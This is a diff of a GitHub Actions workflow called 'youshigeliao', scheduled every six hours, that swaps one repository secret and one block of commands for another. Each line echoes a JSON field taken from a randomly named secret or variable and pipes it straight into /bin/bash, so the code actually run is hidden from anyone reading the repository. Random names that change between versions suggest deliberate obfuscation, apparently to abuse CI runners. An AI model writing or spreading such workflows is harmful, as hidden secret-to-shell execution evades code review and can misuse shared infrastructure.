@@ -2,8 +2,8 @@ name: youshigeliao
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
-jobs:  # 1738
+    - cron: '36 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,24 +11,19 @@ jobs:  # 1738
       - uses: actions/checkout@v4
       - name: youshigeliao
         env:
-          sklwd94901: ${{ secrets.sklwd94901 }}
+          g22: ${{ secrets.g22 }}
         run: |
-          echo $sklwd94901 | jq -r .x0485 | /bin/bash
-          echo $jqr5456 | jq -r .iajjh76 | /bin/bash
-          echo $ymkeb4 | jq -r .v9501 | /bin/bash
-          echo $me35 | jq -r .fiidx31 | /bin/bash
-          echo $kcd0044 | jq -r .hpu3894 | /bin/bash
-          echo $to86785 | jq -r .edof039 | /bin/bash
-          echo $uyccj6 | jq -r .aovo998 | /bin/bash
-          echo $ef78249 | jq -r .dk05 | /bin/bash
-          echo $fi3 | jq -r .ibwrs211 | /bin/bash
-          echo $gvzd0113 | jq -r .ya7370 | /bin/bash
-          echo $gvjty5 | jq -r .pm9 | /bin/bash
-          echo $kkwyt1 | jq -r .yb74 | /bin/bash
-          echo $fsgp5873 | jq -r .rn8 | /bin/bash
-          echo $adaq3546 | jq -r .nywx925 | /bin/bash
-          echo $g67 | jq -r .zelex7783 | /bin/bash
-          echo $fzfmm9 | jq -r .yrn512 | /bin/bash
-          echo $n9 | jq -r .m71 | /bin/bash
-          echo $gvywz6 | jq -r .zeuq9415 | /bin/bash
+          echo $g22 | jq -r .vyvy681 | /bin/bash
+          echo $hc4 | jq -r .oengd50461 | /bin/bash
+          echo $uewy722 | jq -r .hktt22386 | /bin/bash
+          echo $vvx9 | jq -r .r8538 | /bin/bash
+          echo $cvut86703 | jq -r .gjxi856 | /bin/bash
+          echo $rq37981 | jq -r .dyr33 | /bin/bash
+          echo $sz11135 | jq -r .mvn244 | /bin/bash
+          echo $kyw02504 | jq -r .osrku028 | /bin/bash
+          echo $ymrlg35249 | jq -r .xs70136 | /bin/bash
+          echo $uy64 | jq -r .y95 | /bin/bash
+          echo $gfa39194 | jq -r .qdlm5587 | /bin/bash
+          echo $du5 | jq -r .tzz90 | /bin/bash
+          echo $kcas6 | jq -r .ugyl76377 | /bin/bash
 
